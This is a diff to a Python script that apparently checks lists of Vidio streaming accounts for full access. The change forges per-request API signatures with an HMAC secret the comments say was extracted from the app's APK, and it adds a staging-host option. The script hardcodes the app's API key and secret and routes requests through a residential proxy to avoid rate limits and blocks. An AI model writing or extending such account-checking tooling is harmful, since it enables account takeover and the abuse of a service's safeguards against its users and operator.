@@ -24,8 +24,11 @@ same PHP array format.
 
 import base64
 import gzip
+import hashlib
+import hmac
 import http.client
 import json
+import os
 import re
 import sys
 import time
@@ -35,7 +38,10 @@ INPUT_FILE = sys.argv[1] if len(sys.argv) > 1 else "vidio_accounts_input.txt"
 OUTPUT_FILE = sys.argv[2] if len(sys.argv) > 2 else "vidio_accounts_full_access.txt"
 # ponytail: arg ke-3 = batasi jumlah akun yang dicek (sample), biar tidak lama
 LIMIT = int(sys.argv[3]) if len(sys.argv) > 3 else None
-HOST = "api.vidio.com"
+# STAGING=1 / arg ke-4 "staging" -> api.staging.vidio.com (host staging dari APK:
+# np/l.java — api.staging.vidio.com, live.staging.vidio.com)
+STAGING = len(sys.argv) > 4 and sys.argv[4] == "staging" or os.environ.get("STAGING") == "1"
+HOST = "api.staging.vidio.com" if STAGING else "api.vidio.com"
 
 # Same residential proxy main.ts uses for ultimate stream requests, so checks
 # come from the same IP pool instead of getting rate-limited/blocked directly.
@@ -52,13 +58,14 @@ def open_conn():
     conn.set_tunnel(HOST, 443, headers={"Proxy-Authorization": PROXY_AUTH_HEADER})
     return conn
 
-# Static headers copied from the working capture. x-signature/x-client/x-api-auth
-# are app-level, not tied to a specific user, so they stay fixed across accounts.
+# x-client/x-signature di-generate per request (algoritma TokenSignature dari APK):
+# ts = unix detik, x-signature = HMAC-SHA256(key=f"{SECRET}:{ts}", msg=ts) hex lowercase.
+# Secret dari Firebase Remote Config default "live_streaming_token_key" di APK TV & mobile.
+SIGNATURE_SECRET = "V1d10D3v"
+
 STATIC_HEADERS = {
     "User-Agent": "tv-android/2608.2.4 (1020)",
     "Accept-Encoding": "gzip",
-    "x-client": "1788880138",
-    "x-signature": "da9b46946dfbe9b9f6bd2ce453fe819412436e282e97047741a0a981a512fdc4",
     "referer": "androidtv-app://com.vidio.android.tc",
     "x-api-platform": "tv-android",
     "x-api-auth": "laZOmogezono5ogekaso5oz4Mezimew1",
@@ -85,7 +92,12 @@ def parse_accounts(path):
 
 def request(method, path, email=None, token=None):
     """One proxied request; returns (status, parsed_body_or_text)."""
+    ts = str(int(time.time()))
     headers = dict(STATIC_HEADERS)
+    headers["x-client"] = ts
+    headers["x-signature"] = hmac.new(
+        f"{SIGNATURE_SECRET}:{ts}".encode(), ts.encode(), hashlib.sha256
+    ).hexdigest()
     if email:
         headers["x-user-email"] = email
         headers["x-user-token"] = token
